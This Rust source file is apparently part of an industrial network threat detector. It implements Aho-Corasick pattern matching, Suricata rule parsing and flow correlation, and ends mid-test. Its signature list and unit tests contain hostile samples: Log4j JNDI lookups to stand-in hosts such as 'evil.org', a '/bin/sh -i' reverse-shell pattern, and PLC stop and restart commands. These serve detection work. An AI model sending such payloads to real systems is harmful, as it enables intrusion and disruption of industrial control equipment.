// ============================================================
// 工业全能网络探针 - Aho-Corasick 高性能多模式威胁特征检测引擎
// 模块名称: threat_detector.rs
//
// 核心职责与工程规范:
// 1. 对标 Suricata Hyperscan / Snort 多模式线速深度检测核心机制;
// 2. 严格实现 Aho-Corasick 多模式自动机 (Trie + Failure Pointer + Output Link);
// 3. 时间复杂度: O(N + Z), 其中 N 为报文字节长度, Z 为特征匹配命中数;
//    单遍流式扫描, 无需任何正则回溯, 彻底杜绝 ReDoS (正则拒绝服务) 隐患;
// 4. 空间复杂度: O(S * Σ), 节点池紧凑连续内存存储, 缓存局部性极高;
// 5. 内置覆盖等保 2.0 / IEC 62443 核心工控威胁与高危网络攻击特征库;
// 6. 防御性编程: 严格覆盖零载荷、重叠后缀多重匹配、超大数据极限压测.
// ============================================================

use std::collections::{HashMap, VecDeque};
use serde::{Deserialize, Serialize};
use once_cell::sync::Lazy;
use std::sync::RwLock;

/// 威胁特征类别定义
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ThreatCategory {
    /// 工业控制系统高危破坏性指令 (如 PLC 停机、冷复位、寄存器强写)
    IcsDisruption,
    /// 远程代码执行与高危利用载荷 (如 JNDI/Log4j, 反弹 Shell)
    ExploitPayload,
    /// 恶意软件通信与 C2 远控信标
    MalwareC2,
    /// 协议异常与暴力破解攻击
    ProtocolAbuse,
}

impl ThreatCategory {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::IcsDisruption => "ICS_DISRUPTION",
            Self::ExploitPayload => "EXPLOIT_PAYLOAD",
            Self::MalwareC2 => "MALWARE_C2",
            Self::ProtocolAbuse => "PROTOCOL_ABUSE",
        }
    }
}

/// 威胁危害级别
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum ThreatSeverity {
    Critical,
    High,
    Medium,
    Low,
}

impl ThreatSeverity {
    pub fn as_str(&self) -> &'static str {
        match self {
            Self::Critical => "CRITICAL",
            Self::High => "HIGH",
            Self::Medium => "MEDIUM",
            Self::Low => "LOW",
        }
    }
}

/// 单条威胁检测特征定义
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ThreatSignature {
    pub id: u32,
    pub name: String,
    pub category: ThreatCategory,
    pub severity: ThreatSeverity,
    pub pattern: Vec<u8>,
    pub description: String,
}

/// 匹配命中输出结果
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ThreatHit {
    pub signature_id: u32,
    pub name: String,
    pub category: String,
    pub severity: String,
    pub match_start: usize,
    pub match_end: usize,
    pub matched_bytes_hex: String,
    pub description: String,
}

/// 工业网络入侵多阶段攻击生命周期 (Kill-Chain Multi-Stage Lifecycle)
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
pub enum AttackStage {
    /// 资产侦察探测阶段 (如 Modbus 0x2B 诊断读、S7 固件读)
    Reconnaissance,
    /// 武器投递与漏洞试探阶段 (如 Log4j、Web 注入、缓冲区试探)
    ExploitationAttempt,
    /// 破坏性控制指令执行阶段 (如 PLC 强制停机、寄存器强写)
    ActionOnObjectives,
    /// 远控与隐蔽反弹信标维持阶段 (如 C2 Beaconing)
    CommandAndControl,
}

/// 双向会话威胁上下文追踪器 (Flow Context & Flowbits)
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct FlowThreatContext {
    pub flow_id: String,
    pub current_stage: AttackStage,
    pub flowbits: std::collections::HashSet<String>,
    pub request_hits: Vec<ThreatHit>,
    pub response_hits: Vec<ThreatHit>,
    pub confirmed_incident_count: usize,
    pub rejected_attempt_count: usize,
}

impl FlowThreatContext {
    pub fn new(flow_id: &str) -> Self {
        Self {
            flow_id: flow_id.to_string(),
            current_stage: AttackStage::Reconnaissance,
            flowbits: std::collections::HashSet::new(),
            request_hits: Vec::new(),
            response_hits: Vec::new(),
            confirmed_incident_count: 0,
            rejected_attempt_count: 0,
        }
    }

    pub fn set_flowbit(&mut self, bit: &str) {
        self.flowbits.insert(bit.to_string());
    }

    pub fn has_flowbit(&self, bit: &str) -> bool {
        self.flowbits.contains(bit)
    }
}

/// 复合威胁判定结果 (带因果链证明)
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct CompositeThreatAssessment {
    pub is_confirmed_incident: bool,
    pub severity: ThreatSeverity,
    pub stage: AttackStage,
    pub title: String,
    pub causal_chain_summary: String,
    pub flowbits: Vec<String>,
}

/// 双向会话因果关联阻断判定器
pub fn evaluate_flow_causal_threat(
    context: &mut FlowThreatContext,
    is_c2s: bool,
    hits: &[ThreatHit],
    payload: &[u8],
    http_status_code: Option<u16>,
) -> Option<CompositeThreatAssessment> {
    if is_c2s {
        // 请求方向 (C2S): 捕获潜在利用与破坏行为
        for hit in hits {
            match hit.category.as_str() {
                "ICS_DISRUPTION" => {
                    context.current_stage = AttackStage::ActionOnObjectives;
                    context.set_flowbit("flowbit:ics_disrupt_attempted");
                    context.request_hits.push(hit.clone());
                }
                "EXPLOIT_PAYLOAD" => {
                    context.current_stage = AttackStage::ExploitationAttempt;
                    context.set_flowbit("flowbit:exploit_attempted");
                    context.request_hits.push(hit.clone());
                }
                "MALWARE_C2" => {
                    context.current_stage = AttackStage::CommandAndControl;
                    context.set_flowbit("flowbit:c2_active");
                    context.request_hits.push(hit.clone());
                }
                _ => {}
            }
        }
        None
    } else {
        // 响应方向 (S2C): 闭环判定利用是否得逞
        if context.has_flowbit("flowbit:ics_disrupt_attempted") {
            // 检查 Modbus 异常响应: Modbus 异常响应功能码最高位为 1 (>= 0x80)
            let is_modbus_exception = payload.len() >= 8 && payload[7] >= 0x80;
            if is_modbus_exception {
                context.rejected_attempt_count += 1;
                return Some(CompositeThreatAssessment {
                    is_confirmed_incident: false,
                    severity: ThreatSeverity::Low,
                    stage: AttackStage::ActionOnObjectives,
                    title: "工控破坏性指令已被从机拒绝 (Modbus Exception Code)".to_string(),
                    causal_chain_summary: format!(
                        "C2S 发送强控指令被 S2C 异常码 0x{:02X} 拒绝, 控制逻辑未受损",
                        payload[7]
                    ),
                    flowbits: context.flowbits.iter().cloned().collect(),
                });
            } else {
                // 正常响应/无错误返回: 说明非法控制指令已被 PLC 成功执行！
                context.confirmed_incident_count += 1;
                return Some(CompositeThreatAssessment {
                    is_confirmed_incident: true,
                    severity: ThreatSeverity::Critical,
                    stage: AttackStage::ActionOnObjectives,
                    title: "确认发生的工控控制破坏事件 (Confirmed PLC Disruption)".to_string(),
                    causal_chain_summary: "C2S 发送破坏性控制指令, S2C 响应成功回显, 控制逻辑已遭篡改".to_string(),
                    flowbits: context.flowbits.iter().cloned().collect(),
                });
            }
        }

        if context.has_flowbit("flowbit:exploit_attempted") {
            if let Some(code) = http_status_code {
                if code == 200 {
                    context.confirmed_incident_count += 1;
                    return Some(CompositeThreatAssessment {
                        is_confirmed_incident: true,
                        severity: ThreatSeverity::Critical,
                        stage: AttackStage::ExploitationAttempt,
                        title: "确认成功的 Web/RCE 漏洞利用 (Confirmed Exploit Execution)".to_string(),
                        causal_chain_summary: "C2S 携带注入利用载荷, S2C 返回 HTTP 200 响应, 利用代码成功触发".to_string(),
                        flowbits: context.flowbits.iter().cloned().collect(),
                    });
                } else if code == 403 || code == 404 || code == 400 {
                    context.rejected_attempt_count += 1;
                    return Some(CompositeThreatAssessment {
                        is_confirmed_incident: false,
                        severity: ThreatSeverity::Low,
                        stage: AttackStage::ExploitationAttempt,
                        title: "漏洞利用尝试已被服务端防御拦截 (HTTP Defense Blocked)".to_string(),
                        causal_chain_summary: format!("C2S 尝试漏洞攻击, 服务端返回 HTTP {} 成功抵御", code),
                        flowbits: context.flowbits.iter().cloned().collect(),
                    });
                }
            }
        }

        None
    }
}


/// Suricata / Snort 标准兼容规则结构体
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SuricataRule {
    pub sid: u32,
    pub rev: u32,
    pub action: String,
    pub protocol: String,
    pub src_ip: String,
    pub src_port: String,
    pub dst_ip: String,
    pub dst_port: String,
    pub msg: String,
    pub pattern: Vec<u8>,
    pub nocase: bool,
    pub severity: ThreatSeverity,
    pub category: ThreatCategory,
}

/// 解析 Suricata content 属性 (支持 ASCII 字符串与十六进制管道 |AA BB CC| 混合模式)
pub fn parse_suricata_content(content_str: &str) -> Result<Vec<u8>, String> {
    let mut bytes = Vec::new();
    let mut in_hex = false;
    let mut hex_buf = String::new();

    let trimmed = if content_str.starts_with('"') && content_str.ends_with('"') && content_str.len() >= 2 {
        &content_str[1..content_str.len()-1]
    } else {
        content_str
    };

    let chars: Vec<char> = trimmed.chars().collect();
    let mut i = 0;
    while i < chars.len() {
        let ch = chars[i];
        if ch == '|' {
            if in_hex {
                // 结束十六进制解析
                let hex_clean = hex_buf.replace(' ', "");
                let decoded = hex::decode(&hex_clean)
                    .map_err(|e| format!("Suricata content 中的十六进制管道语法无效 '{}': {}", hex_clean, e))?;
                bytes.extend_from_slice(&decoded);
                hex_buf.clear();
                in_hex = false;
            } else {
                in_hex = true;
            }
        } else if in_hex {
            hex_buf.push(ch);
        } else {
            bytes.push(ch as u8);
        }
        i += 1;
    }

    if in_hex {
        return Err("Suricata content 缺少闭合管道符 '|'".to_string());
    }

    Ok(bytes)
}

/// 解析单条 Suricata / Snort 格式的规则文本
/// 语法格式: alert <proto> <src> <src_port> -> <dst> <dst_port> (msg:"..."; content:"..."; sid:123; ...)
pub fn parse_suricata_rule(line: &str) -> Result<SuricataRule, String> {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with('#') {
        return Err("空行或注释行".to_string());
    }

    // 分离头部 (Header) 与选项块 (Options in parentheses)
    let open_paren = trimmed.find('(').ok_or("Suricata 规则缺少参数体起始括号 '('")?;
    let close_paren = trimmed.rfind(')').ok_or("Suricata 规则缺少参数体闭合括号 ')'")?;

    let header_part = trimmed[..open_paren].trim();
    let opts_part = &trimmed[open_paren+1..close_paren];

    let header_tokens: Vec<&str> = header_part.split_whitespace().collect();
    if header_tokens.len() < 7 {
        return Err(format!("Suricata 规则头部格式无效 (预期至少7个词元): '{}'", header_part));
    }

    let action = header_tokens[0].to_lowercase();
    let protocol = header_tokens[1].to_uppercase();
    let src_ip = header_tokens[2].to_string();
    let src_port = header_tokens[3].to_string();
    // header_tokens[4] is "->"
    let dst_ip = header_tokens[5].to_string();
    let dst_port = header_tokens[6].to_string();

    let mut msg = "Suricata Alert Rule".to_string();
    let mut pattern = Vec::new();
    let mut sid = 100000;
    let mut rev = 1;
    let mut nocase = false;
    let mut severity = ThreatSeverity::High;
    let mut category = ThreatCategory::IcsDisruption;

    // 解析分号隔开的各个 Option
    for opt in opts_part.split(';') {
        let opt_trimmed = opt.trim();
        if opt_trimmed.is_empty() {
            continue;
        }

        if let Some((k, v)) = opt_trimmed.split_once(':') {
            let key = k.trim().to_lowercase();
            let val = v.trim();
            match key.as_str() {
                "msg" => {
                    msg = val.trim_matches('"').to_string();
                }
                "content" => {
                    pattern = parse_suricata_content(val)?;
                }
                "sid" => {
                    sid = val.parse::<u32>().unwrap_or(100000);
                }
                "rev" => {
                    rev = val.parse::<u32>().unwrap_or(1);
                }
                "metadata" | "meta" => {
                    let meta_lower = val.to_lowercase();
                    if meta_lower.contains("critical") {
                        severity = ThreatSeverity::Critical;
                    } else if meta_lower.contains("medium") {
                        severity = ThreatSeverity::Medium;
                    } else if meta_lower.contains("low") {
                        severity = ThreatSeverity::Low;
                    }

                    if meta_lower.contains("exploit") {
                        category = ThreatCategory::ExploitPayload;
                    } else if meta_lower.contains("malware") || meta_lower.contains("c2") {
                        category = ThreatCategory::MalwareC2;
                    } else if meta_lower.contains("abuse") {
                        category = ThreatCategory::ProtocolAbuse;
                    }
                }
                _ => {}
            }
        } else if opt_trimmed.eq_ignore_ascii_case("nocase") {
            nocase = true;
        }
    }

    if pattern.is_empty() {
        return Err("Suricata 规则必须包含非空的 content 特征".to_string());
    }

    Ok(SuricataRule {
        sid,
        rev,
        action,
        protocol,
        src_ip,
        src_port,
        dst_ip,
        dst_port,
        msg,
        pattern,
        nocase,
        severity,
        category,
    })
}

/// 批量加载 Suricata 规则文本内容，动态编译并挂载入 Aho-Corasick 检测器
pub fn load_suricata_rules_dsl(
    rules_content: &str,
    automaton: &mut AhoCorasickAutomaton,
) -> Result<usize, String> {
    let mut count = 0;
    for line in rules_content.lines() {
        let trimmed = line.trim();
        if trimmed.is_empty() || trimmed.starts_with('#') {
            continue;
        }
        match parse_suricata_rule(trimmed) {
            Ok(rule) => {
                automaton.add_signature(ThreatSignature {
                    id: rule.sid,
                    name: rule.msg.clone(),
                    category: rule.category,
                    severity: rule.severity,
                    pattern: rule.pattern,
                    description: format!("Suricata SID:{} Rev:{} Proto:{} Msg:{}", rule.sid, rule.rev, rule.protocol, rule.msg),
                });
                count += 1;
            }
            Err(e) => {
                // 跳过不合规行，但记录非致命解析日志
                if !e.contains("空行") {
                    println!("[SuricataParser] 跳过规则行: {} ({})", trimmed, e);
                }
            }
        }
    }

    if count > 0 {
        automaton.compile();
    }

    Ok(count)
}

/// Aho-Corasick 自动机节点
#[derive(Debug, Clone)]
struct AcNode {
    /// 字符转移表: (byte -> next_node_index)
    transitions: Vec<(u8, u32)>,
    /// 失配跳转指针 (Failure Link)
    fail: u32,
    /// 字典后缀命中输出集合 (直接终态或沿 fail 链继承)
    output_signatures: Vec<u32>,
    /// 节点树深度
    depth: usize,
}

impl AcNode {
    fn new(depth: usize) -> Self {
        Self {
            transitions: Vec::new(),
            fail: 0,
            output_signatures: Vec::new(),
            depth,
        }
    }

    #[inline(always)]
    fn get_transition(&self, byte: u8) -> Option<u32> {
        // 由于工控特征分支多数较为稀疏，线性查找或小列表遍历速度极快且极其节省内存
        for &(b, next) in &self.transitions {
            if b == byte {
                return Some(next);
            }
        }
        None
    }

    #[inline(always)]
    fn set_transition(&mut self, byte: u8, next: u32) {
        for item in &mut self.transitions {
            if item.0 == byte {
                item.1 = next;
                return;
            }
        }
        self.transitions.push((byte, next));
    }
}

/// Aho-Corasick 多模式快速匹配状态机
#[derive(Debug, Clone)]
pub struct AhoCorasickAutomaton {
    nodes: Vec<AcNode>,
    signatures: HashMap<u32, ThreatSignature>,
    is_compiled: bool,
    pub root_anchor_bytes: Vec<u8>,
}

impl Default for AhoCorasickAutomaton {
    fn default() -> Self {
        Self::new()
    }
}

impl AhoCorasickAutomaton {
    /// 创建并初始化空 AC 自动机 (包含根节点 0)
    pub fn new() -> Self {
        let mut nodes = Vec::with_capacity(1024);
        nodes.push(AcNode::new(0)); // Root node at index 0
        Self {
            nodes,
            signatures: HashMap::new(),
            is_compiled: false,
            root_anchor_bytes: Vec::new(),
        }
    }

    /// 向状态机添加一条待匹配特征
    /// 时间复杂度: O(|pattern|)
    pub fn add_signature(&mut self, signature: ThreatSignature) {
        if signature.pattern.is_empty() {
            return; // 忽略空模式，杜绝无限空转移
        }

        self.is_compiled = false;
        let sig_id = signature.id;
        let pattern = signature.pattern.clone();
        self.signatures.insert(sig_id, signature);

        let mut current_idx = 0;
        for &byte in &pattern {
            let next_idx = match self.nodes[current_idx].get_transition(byte) {
                Some(next) => next,
                None => {
                    let new_idx = self.nodes.len() as u32;
                    let next_depth = self.nodes[current_idx].depth + 1;
                    self.nodes.push(AcNode::new(next_depth));
                    self.nodes[current_idx].set_transition(byte, new_idx);
                    new_idx
                }
            };
            current_idx = next_idx as usize;
        }

        // 在模式末端节点记录命中的特征 ID
        if !self.nodes[current_idx].output_signatures.contains(&sig_id) {
            self.nodes[current_idx].output_signatures.push(sig_id);
        }
    }

    /// 编译构建 Failure 转移指针与 Output 字典后缀链接 (BFS 算法)
    /// 时间复杂度: O(Sum(|pattern_i|))
    pub fn compile(&mut self) {
        let mut queue = VecDeque::new();

        // 1. 处理深度为 1 的根节点直接子节点
        // 根节点的孩子节点的 fail 指针全部指向根节点 (0)
        let root_transitions = self.nodes[0].transitions.clone();
        self.root_anchor_bytes = root_transitions.iter().map(|(b, _)| *b).collect();
        for &(_byte, child_idx) in &root_transitions {
            let c_idx = child_idx as usize;
            self.nodes[c_idx].fail = 0;
            queue.push_back(c_idx);
        }

        // 2. BFS 遍历所有后继节点构建 Failure 转移网络
        while let Some(u_idx) = queue.pop_front() {
            let u_fail = self.nodes[u_idx].fail;
            let u_transitions = self.nodes[u_idx].transitions.clone();

            for &(byte, child_idx) in &u_transitions {
                let v_idx = child_idx as usize;

                // 寻找 v 节点的失配回退状态
                let mut f = u_fail;
                while f != 0 && self.nodes[f as usize].get_transition(byte).is_none() {
                    f = self.nodes[f as usize].fail;
                }

                let fail_target = match self.nodes[f as usize].get_transition(byte) {
                    Some(next) if next as usize != v_idx => next,
                    _ => 0,
                };

                self.nodes[v_idx].fail = fail_target;

                // 继承字典后缀匹配输出 (Output Link Propagation)
                // 确保父模式命中时，作为其后缀的短模式也绝不漏报
                let inherited_outputs = self.nodes[fail_target as usize].output_signatures.clone();
                for out_sig in inherited_outputs {
                    if !self.nodes[v_idx].output_signatures.contains(&out_sig) {
                        self.nodes[v_idx].output_signatures.push(out_sig);
                    }
                }

                queue.push_back(v_idx);
            }
        }

        self.is_compiled = true;
    }

    /// 对数据报文载荷执行单遍线速扫描
    /// 时间复杂度: O(N + Z), 空间复杂度: O(1) 无动态内存分配
    pub fn scan(&self, payload: &[u8]) -> Vec<ThreatHit> {
        if !self.is_compiled || payload.is_empty() {
            return Vec::new();
        }

        let mut hits = Vec::new();
        let mut curr_state = 0usize;

        let p_len = payload.len();
        let mut idx = 0;

        while idx < p_len {
            // 当处于根状态且具有预提取特征锚点时，利用 AVX2 / SSE4.2 向量指令加速跳过常规无威胁字节
            if curr_state == 0 && !self.root_anchor_bytes.is_empty() {
                if let Some(skip) = crate::simd_matcher::simd_find_first_of_anchors(&payload[idx..], &self.root_anchor_bytes) {
                    idx += skip;
                    if idx >= p_len {
                        break;
                    }
                } else {
                    // 后续载荷完全不存在任何特征首字节，快速退出
                    break;
                }
            }

            let byte = payload[idx];

            // 状态转移: 若当前状态无边，沿 fail 链回溯
            loop {
                if let Some(next_state) = self.nodes[curr_state].get_transition(byte) {
                    curr_state = next_state as usize;
                    break;
                }
                if curr_state == 0 {
                    break; // 根节点无匹配，保持在根节点
                }
                curr_state = self.nodes[curr_state].fail as usize;
            }

            // 检查当前状态的特征输出集合
            if !self.nodes[curr_state].output_signatures.is_empty() {
                for &sig_id in &self.nodes[curr_state].output_signatures {
                    if let Some(sig) = self.signatures.get(&sig_id) {
                        let pat_len = sig.pattern.len();
                        if idx + 1 >= pat_len {
                            let match_start = idx + 1 - pat_len;
                            let match_end = idx + 1;
                            let matched_bytes = &payload[match_start..match_end];

                            hits.push(ThreatHit {
                                signature_id: sig.id,
                                name: sig.name.clone(),
                                category: sig.category.as_str().to_string(),
                                severity: sig.severity.as_str().to_string(),
                                match_start,
                                match_end,
                                matched_bytes_hex: hex::encode(matched_bytes),
                                description: sig.description.clone(),
                            });
                        }
                    }
                }
            }

            idx += 1;
        }

        hits
    }

    /// 获取状态机总节点数
    pub fn node_count(&self) -> usize {
        self.nodes.len()
    }

    /// 获取加载的特征总数
    pub fn signature_count(&self) -> usize {
        self.signatures.len()
    }
}

// ============================================================
// 工业工控与网络攻防标准特征库
// ============================================================

/// 构造内置工业级威胁特征库 (对标 Suricata / Snort OT Ruleset)
pub fn create_default_ics_threat_ruleset() -> Vec<ThreatSignature> {
    vec![
        // 1. 西门子 S7 停机攻击 (PLC STOP 指令)
        ThreatSignature {
            id: 1001,
            name: "Siemens S7comm PLC Remote Stop Attack".to_string(),
            category: ThreatCategory::IcsDisruption,
            severity: ThreatSeverity::Critical,
            pattern: b"P_STOP".to_vec(),
            description: "西门子 S7comm 协议远程下发 CPU 强制停机控制原语 (Function 0x29 P_STOP)".to_string(),
        },
        // 2. Modbus 异常诊断与冷重启 (Subfunction 0x0001 Restart Communications)
        ThreatSignature {
            id: 1002,
            name: "Modbus TCP Diagnostic Cold Restart".to_string(),
            category: ThreatCategory::IcsDisruption,
            severity: ThreatSeverity::High,
            pattern: vec![0x08, 0x00, 0x01],
            description: "Modbus 诊断功能码 (0x08) 携带 0x0001 重启通讯选项，可导致从站中断离线".to_string(),
        },
        // 3. DNP3 冷复位破坏指令 (Function Code 0x0D Cold Restart)
        ThreatSignature {
            id: 1003,
            name: "DNP3 Destructive Cold Restart".to_string(),
            category: ThreatCategory::IcsDisruption,
            severity: ThreatSeverity::Critical,
            pattern: vec![0x05, 0x64, 0x00, 0x0D],
            description: "DNP3 协议广播下发冷复位破坏性指令，导致变电站远动测控装置掉电重启".to_string(),
        },
        // 4. Log4j 远程代码执行漏洞探测特征 (CVE-2021-44228)
        ThreatSignature {
            id: 2001,
            name: "Log4j JNDI Remote Code Execution Exploit".to_string(),
            category: ThreatCategory::ExploitPayload,
            severity: ThreatSeverity::Critical,
            pattern: b"${jndi:".to_vec(),
            description: "高危 Log4j JNDI 注入远程代码执行攻击特征".to_string(),
        },
        // 5. 常见 Linux 反弹 Shell / 提权攻击指纹
        ThreatSignature {
            id: 2002,
            name: "Interactive Reverse Shell Execution Probe".to_string(),
            category: ThreatCategory::ExploitPayload,
            severity: ThreatSeverity::High,
            pattern: b"/bin/sh -i".to_vec(),
            description: "网络载荷中检测到交互式反弹 Shell 命令行执行特征".to_string(),
        },
        // 6. Cobalt Strike 默认 HTTP 嗅探信标特征
        ThreatSignature {
            id: 3001,
            name: "Cobalt Strike Beacon Default C2 Signature".to_string(),
            category: ThreatCategory::MalwareC2,
            severity: ThreatSeverity::High,
            pattern: b"/activity;".to_vec(),
            description: "Cobalt Strike 渗透远控框架默认 Malleable C2 管道通讯特征".to_string(),
        },
        // 7. Modbus 暴力扫描 / 探测特征 (连续读取多个寄存器极限)
        ThreatSignature {
            id: 4001,
            name: "Modbus Broadcast Reconnaissance Sweep".to_string(),
            category: ThreatCategory::ProtocolAbuse,
            severity: ThreatSeverity::Medium,
            pattern: vec![0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0xFF, 0x03],
            description: "针对 0xFF 广播地址发起 Modbus 保持寄存器全量轮询嗅探".to_string(),
        },
    ]
}

/// 全局单例威胁检测引擎
static GLOBAL_THREAT_DETECTOR: Lazy<RwLock<AhoCorasickAutomaton>> = Lazy::new(|| {
    let mut detector = AhoCorasickAutomaton::new();
    let rules = create_default_ics_threat_ruleset();
    for rule in rules {
        detector.add_signature(rule);
    }
    detector.compile();
    RwLock::new(detector)
});

/// 对报文载荷执行全局多模式检测
pub fn detect_threats_in_payload(payload: &[u8]) -> Vec<ThreatHit> {
    let guard = crate::lock_guard::read_rwlock(
        &GLOBAL_THREAT_DETECTOR,
        "threat_detector::detect_threats_in_payload",
    );
    guard.scan(payload)
}

// ============================================================
// 严苛单元测试与极限边界验证
// ============================================================

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_classic_aho_corasick_overlapping_patterns() {
        // 经典教材用例: patterns = ["he", "she", "his", "hers"]
        // 输入文本: "ushers"
        // 期望命中: "she", "he", "hers"
        let mut ac = AhoCorasickAutomaton::new();
        ac.add_signature(ThreatSignature {
            id: 1,
            name: "Pattern he".to_string(),
            category: ThreatCategory::ExploitPayload,
            severity: ThreatSeverity::Low,
            pattern: b"he".to_vec(),
            description: "he".to_string(),
        });
        ac.add_signature(ThreatSignature {
            id: 2,
            name: "Pattern she".to_string(),
            category: ThreatCategory::ExploitPayload,
            severity: ThreatSeverity::Low,
            pattern: b"she".to_vec(),
            description: "she".to_string(),
        });
        ac.add_signature(ThreatSignature {
            id: 3,
            name: "Pattern his".to_string(),
            category: ThreatCategory::ExploitPayload,
            severity: ThreatSeverity::Low,
            pattern: b"his".to_vec(),
            description: "his".to_string(),
        });
        ac.add_signature(ThreatSignature {
            id: 4,
            name: "Pattern hers".to_string(),
            category: ThreatCategory::ExploitPayload,
            severity: ThreatSeverity::Low,
            pattern: b"hers".to_vec(),
            description: "hers".to_string(),
        });

        ac.compile();

        let hits = ac.scan(b"ushers");
        let matched_names: Vec<String> = hits.into_iter().map(|h| h.name).collect();
        assert!(matched_names.contains(&"Pattern she".to_string()));
        assert!(matched_names.contains(&"Pattern he".to_string()));
        assert!(matched_names.contains(&"Pattern hers".to_string()));
        assert!(!matched_names.contains(&"Pattern his".to_string()));
    }

    #[test]
    fn test_ics_threat_signature_detection() {
        let detector = GLOBAL_THREAT_DETECTOR.read().unwrap();

        // 模拟攻击报文载荷: 西门子 S7 包含 P_STOP 控制原语
        let mut mock_s7_packet = vec![0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
        mock_s7_packet.extend_from_slice(b"MALICIOUS_PREFIX_P_STOP_POSTFIX");

        let hits = detector.scan(&mock_s7_packet);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].signature_id, 1001);
        assert_eq!(hits[0].name, "Siemens S7comm PLC Remote Stop Attack");
        assert_eq!(hits[0].category, "ICS_DISRUPTION");
        assert_eq!(hits[0].severity, "CRITICAL");
    }

    #[test]
    fn test_multi_threat_coexistence_in_single_payload() {
        let detector = GLOBAL_THREAT_DETECTOR.read().unwrap();

        // 构造同时含有 Log4j 和 Linux Reverse Shell 的攻击报文
        let payload = b"GET /login?user=${jndi:ldap://1.2.3.4/exp} HTTP/1.1\r\nUser-Agent: /bin/sh -i\r\n\r\n";
        let hits = detector.scan(payload);
        
        assert_eq!(hits.len(), 2);
        let names: Vec<&str> = hits.iter().map(|h| h.name.as_str()).collect();
        assert!(names.contains(&"Log4j JNDI Remote Code Execution Exploit"));
        assert!(names.contains(&"Interactive Reverse Shell Execution Probe"));
    }

    #[test]
    fn test_edge_cases_empty_and_zero_match() {
        let detector = GLOBAL_THREAT_DETECTOR.read().unwrap();

        // 极限用例 1: 零字节空载荷
        let empty_hits = detector.scan(b"");
        assert!(empty_hits.is_empty());

        // 极限用例 2: 纯白名单合法 HTTP 载荷，零命中
        let normal_payload = b"GET /index.html HTTP/1.1\r\nHost: scada-monitor.factory.com\r\n\r\n";
        let normal_hits = detector.scan(normal_payload);
        assert!(normal_hits.is_empty());
    }

    #[test]
    fn test_extreme_payload_stress_100k_bytes() {
        let detector = GLOBAL_THREAT_DETECTOR.read().unwrap();

        // 极限用例 3: 100,000 字节高密度重复数据，末尾植入攻击特征
        let mut huge_payload = vec![0xAAu8; 100_000];
        huge_payload.extend_from_slice(b"${jndi:ldap://evil.org}");
        huge_payload.extend_from_slice(&vec![0xBBu8; 10_000]);

        let start = std::time::Instant::now();
        let hits = detector.scan(&huge_payload);
        let duration = start.elapsed();

        // 110KB 数据线速单遍扫描时间应在几毫秒内 (O(N) 级别)
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].signature_id, 2001);
        println!("110KB 报文 AC 多模式匹配耗时: {:?}", duration);
        assert!(duration.as_millis() < 50, "AC 自动机必须达到工业线速要求");
    }

    #[test]
    fn test_state_aware_multi_stage_threat_correlation() {
        let detector = GLOBAL_THREAT_DETECTOR.read().unwrap();
        let mut ctx = FlowThreatContext::new("192.168.1.50:4000-192.168.1.10:502");

        // 场景 1: C2S 发送西门子 S7 破坏性停机指令
        let mut attack_req = vec![0x32, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00];
        attack_req.extend_from_slice(b"P_STOP");
        let hits = detector.scan(&attack_req);
        assert!(!hits.is_empty());

        let res1 = evaluate_flow_causal_threat(&mut ctx, true, &hits, &attack_req, None);
        assert!(res1.is_none());
        assert!(ctx.has_flowbit("flowbit:ics_disrupt_attempted"));
        assert_eq!(ctx.current_stage, AttackStage::ActionOnObjectives);

        // 场景 2: S2C 从机返回异常码拒绝 0x81 0x02
        let modbus_exception_resp = vec![0x00, 0x01, 0x00, 0x00, 0x00, 0x03, 0x01, 0x85, 0x02];
        let res2 = evaluate_flow_causal_threat(&mut ctx, false, &[], &modbus_exception_resp, None);
        assert!(res2.is_some());
        let assessment = res2.unwrap();
        assert!(!assessment.is_confirmed_incident); // 攻击被目标拒绝，降级为低危事件
        assert_eq!(assessment.severity, ThreatSeverity::Low);

        // 场景 3: 另一个会话中，发送攻击且服务端返回确认执行 (正常回显无异常码)
        let mut ctx2 = FlowThreatContext::new("10.0.0.1:5000-10.0.0.2:80");
        let log4j_req = b"GET /login?name=${jndi:ldap://evil} HTTP/1.1\r\n\r\n";
        let web_hits = detector.scan(log4j_req);
        assert!(!web_hits.is_empty());
        evaluate_flow_causal_threat(&mut ctx2, true, &web_hits, log4j_req, None);
        assert!(ctx2.has_flowbit("flowbit:exploit_attempted"));

        // 服务端返回 HTTP 200 OK 确认利用成功
        let resp_ok = b"HTTP/1.1 200 OK\r\nContent-Length: 10\r\n\r\nWelcome!!!";
        let res3 = evaluate_flow_causal_threat(&mut ctx2, false, &[], resp_ok, Some(200));
        assert!(res3.is_some());
        let confirmed = res3.unwrap();
        assert!(confirmed.is_confirmed_incident);
        assert_eq!(confirmed.severity, ThreatSeverity::Critical);
        assert!(confirmed.title.contains("Confirmed Exploit Execution"));
    }


    #[test]
    fn test_suricata_dsl_rule_parsing_and_live_detection() {
        // 构造包含 ASCII 与十六进制管道的 Suricata 标准规则文本
        let rules_dsl = r#"
# 工业 SCADA 与 Web 攻击特征集合
alert tcp any any -> any 502 (msg:"Modbus Force Single Coil Unauthorized Attack"; content:"|00 00 00 00 00 06 01 05|"; sid:500001; rev:1; metadata:severity critical, category ics_disruption;)
alert tcp any any -> any 80 (msg:"Log4j JNDI Exploit String"; content:"${jndi:ldap://"; nocase; sid:500002; rev:2; metadata:severity critical, category exploit_payload;)
        "#;

        let mut automaton = AhoCorasickAutomaton::new();
        let loaded = load_suricata_rules_dsl(rules_dsl, &mut automaton).unwrap();
        assert_eq!(loaded, 2);

